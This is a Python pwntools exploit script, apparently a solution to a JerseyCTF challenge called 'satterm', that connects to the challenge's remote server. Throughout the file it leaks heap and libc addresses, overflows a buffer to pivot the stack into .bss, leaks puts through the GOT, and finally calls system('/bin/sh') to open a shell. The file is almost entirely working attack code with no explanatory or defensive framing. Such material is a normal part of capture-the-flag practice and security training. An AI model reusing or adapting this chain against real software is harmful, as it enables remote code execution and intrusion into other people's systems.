#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('satterm_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x401AFF 
        b*0x0401B5F 
        b*main+372 
        b*0x04017A1
        b*setcontext+127
        c
        ''')
        sleep(1)

#  nc sat-term.aws.jerseyctf.com 5000 
if args.REMOTE:
    p = remote('sat-term.aws.jerseyctf.com', 5000)
else:
    p = process([exe.path])

sa(b'> ', b'DIAGNOSE\0'.ljust(0x3D0, b'a'))
sla(b'PASSWORD> ', b'COSMOLINE')
ru(b'MALLOC SUCCESS (')

heap_leak = int(p.recvuntil(b')', drop=True), 16)
info(f'heap leak: {hex(heap_leak)}')



input_addr = exe.sym.input+8
def trigger():
    sa(b'> ', b'SETTINGS')
    sla(b'CHANGE [Y/N]: ', b'Y')
    sla(b'APOAPSIS: ', b'1')
    sla(b'PERIAPSIS: ', b'2')
    sla(b'ORBIT INCLINE: ', b'3')
    sla(b'DOWNLINK SYNCHRONIZATION MS: ', b'18085355664179190')
    sla(b'SATELLITE SAFE MODE [Y/N]: ', b'Y')
trigger()
GDB()
bss= 0x404000
bof = flat(
    b'STATUS\0\0',
    b'flag.txt',
    b'\0'*0x60,
    0, #rdi
    exe.sym.input, # rsi
    bss+0xfa0-8, #rbp
    0,
    0x1000, # rdx
    b'\0'*0x10, # rcx 0x98
    bss+0xfa0, # rsp
    exe.sym.main+203 , # saved rip 1 
    b'\0'*0x30,
    p64(0x404180 ), # saved rip 2
    b'\0'*0x210,
     # something
)
sa(b'> ', bof)
input("363636363633636363636363636")

load = flat(
    b'STATUS\0\0',
    b'flag.txt',
    b'\0'*0x60,
    exe.got.puts, #rdi
    0, # rsi
    bss+0xfa0-8, #rbp
    0,
    0, # rdx
    b'\0'*0x10, # rcx 0x98
    bss+0xfa0, # rsp
    exe.plt.puts , # saved rip 1 
    b'\0'*0x30,
    p64(0x404180 ), # rcx
    b'\0'*0x210,
)
load = load.ljust(0x400, b'\0')
load += p64(exe.sym.input+8)

load = load.ljust(0xed8, b'\0')
load += p64(0x0401BEA) # saved rip read

load = load.ljust(0xf20, b'\0')
load += p64(exe.sym.main) # saved rip 2

sa(b'> ', load)
a = ru(b'COMMAND STATUS\n')
# b = r(15)
c = r(6)
print(c)
libc_leak = u64(c + b'\0\0')
libc.address = libc_leak - libc.sym.puts

info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

trigger()
bof = flat(
    b'STATUS\0\0',
    b'flag.txt',
    b'\0'*0x60,
    next(libc.search(b'/bin/sh')), #rdi
    0, # rsi
    bss+0xfa0-8, #rbp
    0,
    0, # rdx
    b'\0'*0x10, # rcx 0x98
    bss+0xfa8, # rsp
    libc.sym.system, # saved rip 1 
    b'\0'*0x30,
    p64(0x404180 ), # saved rip 2
    b'\0'*0x210,
     # something
)
sa(b'> ', bof)

p.interactive()
